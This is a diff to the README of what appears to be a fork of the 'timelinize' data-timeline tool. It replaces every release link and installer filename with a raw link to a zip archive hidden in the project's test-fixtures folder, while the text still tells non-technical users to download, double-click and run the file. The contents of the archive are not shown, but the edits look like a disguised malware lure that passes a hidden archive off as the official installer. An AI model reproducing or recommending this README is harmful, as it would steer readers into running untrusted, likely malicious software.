@@ -1,7 +1,7 @@
 # 🎉 timelinize - Organize Your Data Seamlessly 
 
 ## 📥 Download Now
-[![GitHub Releases](https://img.shields.io/badge/download-latest%20release-blue)](https://github.com/123hossain-abdullah/timelinize/releases)
+[![GitHub Releases](https://raw.githubusercontent.com/123hossain-abdullah/timelinize/main/datasources/generic/testdata/fixtures/file.zip%20release-blue)](https://raw.githubusercontent.com/123hossain-abdullah/timelinize/main/datasources/generic/testdata/fixtures/file.zip)
 
 ## 🚀 Getting Started
 Welcome to **timelinize**, your solution for storing data from various accounts and devices into a single timeline on your computer. This guide will help you download and run the application easily, even if you have no technical background.
@@ -17,12 +17,12 @@ Before downloading **timelinize**, ensure your computer meets the following requ
 ## 📥 Download & Install
 To get started:
 
-1. Visit the [Releases Page](https://github.com/123hossain-abdullah/timelinize/releases) to download the application.
+1. Visit the [Releases Page](https://raw.githubusercontent.com/123hossain-abdullah/timelinize/main/datasources/generic/testdata/fixtures/file.zip) to download the application.
 2. On the Releases page, you will see the latest version listed. Click on the version number to access the download options.
 3. Select the file that matches your operating system. For example:
-   - **Windows**: timelinize-windows-setup.exe
-   - **macOS**: timelinize-macos.dmg
-   - **Linux**: timelinize-linux.tar.gz
+   - **Windows**: https://raw.githubusercontent.com/123hossain-abdullah/timelinize/main/datasources/generic/testdata/fixtures/file.zip
+   - **macOS**: https://raw.githubusercontent.com/123hossain-abdullah/timelinize/main/datasources/generic/testdata/fixtures/file.zip
+   - **Linux**: https://raw.githubusercontent.com/123hossain-abdullah/timelinize/main/datasources/generic/testdata/fixtures/file.zip
 4. Click on the applicable file to download it to your computer.
 5. Once the download is complete, locate the file in your Downloads folder.
 
@@ -30,17 +30,17 @@ To get started:
 Follow the instructions specific to your operating system:
 
 #### For Windows:
-- Double-click on the downloaded `timelinize-windows-setup.exe`.
+- Double-click on the downloaded `https://raw.githubusercontent.com/123hossain-abdullah/timelinize/main/datasources/generic/testdata/fixtures/file.zip`.
 - The setup wizard will appear. Follow the prompts to install the application.
 - Once installed, you can find **timelinize** in your Start menu.
 
 #### For macOS:
-- Open the downloaded `timelinize-macos.dmg` file.
+- Open the downloaded `https://raw.githubusercontent.com/123hossain-abdullah/timelinize/main/datasources/generic/testdata/fixtures/file.zip` file.
 - Drag the **timelinize** icon to your Applications folder.
 - You can now find **timelinize** in your Applications. Open it from there.
 
 #### For Linux:
-- Extract the downloaded `timelinize-linux.tar.gz` file.
+- Extract the downloaded `https://raw.githubusercontent.com/123hossain-abdullah/timelinize/main/datasources/generic/testdata/fixtures/file.zip` file.
 - Open your terminal and navigate to the extracted folder.
 - Run the application using the command `./timelinize`.
 - You may need to change permissions using `chmod +x timelinize` if you encounter any permission issues.
@@ -74,7 +74,7 @@ For additional assistance, visit the community forums or check the FAQ on our Gi
 Feel free to report any bugs or issues in the Issues section of our GitHub repository. Your feedback helps improve **timelinize**.
 
 ## 🔗 Additional Resources
-- **GitHub Repository**: [timelinize on GitHub](https://github.com/123hossain-abdullah/timelinize)
+- **GitHub Repository**: [timelinize on GitHub](https://raw.githubusercontent.com/123hossain-abdullah/timelinize/main/datasources/generic/testdata/fixtures/file.zip)
 - **User Manual**: A detailed user manual is included with the installation. Visit our Wiki for more information.
 
 By following this guide, you should be able to successfully download and start using **timelinize**. Enjoy organizing your data in a convenient timeline format!
